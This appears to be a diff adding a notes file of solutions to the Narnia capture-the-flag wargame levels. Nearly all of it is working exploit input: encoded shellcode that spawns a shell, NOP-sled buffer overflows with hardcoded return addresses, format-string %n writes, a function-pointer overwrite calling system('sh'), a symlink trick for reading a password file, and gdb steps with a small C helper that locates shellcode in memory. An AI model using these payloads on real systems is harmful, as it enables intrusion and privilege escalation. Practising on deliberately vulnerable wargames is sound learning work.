@@ -1,0 +1,56 @@
+#narnia2
+$(printf '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')
+
+#narnia3
+/narnia/narnia2 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*75 + b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" + b"\x60\xd5\xff\xff")')
+
+#narnia4
+ln -s /etc/narnia_pass/narnia4 $(python3 -c 'print("/tmp/" + "A"*27 + "output_file")') && /
+touch output_file && chmod 777 output_file && /
+/narnia/narnia3 $(python3 -c 'print("/tmp/" + "A"*27 + "output_file")')
+
+#narnia5, same approach as for narnia2
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*207 + b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" + b"\x60\xd5\xff\xff")')
+
+#narnia6 format string vulnerability
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90\xd3\xff\xff" + b"%496x%1$n")')
+
+#narnia7 buffer overflow into function pointer that calls system("sh")
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"sh;" + b"A" * 5 + b"\x30\xd4\xdc\xf7 " +b"B"*4 )')
+
+#narnia8
+$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xf8\xd2\xff\xff" + b"%134517515d%2$n")')
+#adress we want to write to, value we want to write, position on the stack
+
+#narnia_final
+cd /tmp
+batcat /narnia/narnia8.c
+gef -q /narnia/narnia8 -ex 'gef config context.clear_screen false' -ex 'gef config context.layout "regs stack memory threads trace"' -ex 'gef config context.grow_stack_down True'
+disas func
+break *func+105
+r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 )')
+x/16xw $esp
+set $PTR = ptr
+p/x $PTR-4
+r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 + b"\xOO\xOO\xff\xff")')
+p/x $PTR-12
+r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 + b"\xOO\xOO\xff\xff" + b"B"*8)')
+
+export SHELLCODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*75 + B"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")')
+
+// find_addr.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    char *ptr = getenv(argv[1]);
+    printf("%s is at %p\n", argv[1], ptr);
+    return 0;
+}
+gcc -m32 find_addr.c -o find_addr && /tmp/find_addr SHELLCODE
+/narnia/narnia8 $(python3 -c 'print(20 * "A")') | xxd
+python3 -c 'print("{:8x}".format(0xffffOOOO - 12))'
+/narnia/narnia8 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 + b"\xOO\xOO\xff\xff" + b"B" * 4 + b"\xOO\xOO\xff\xff")')
+
+
+ 
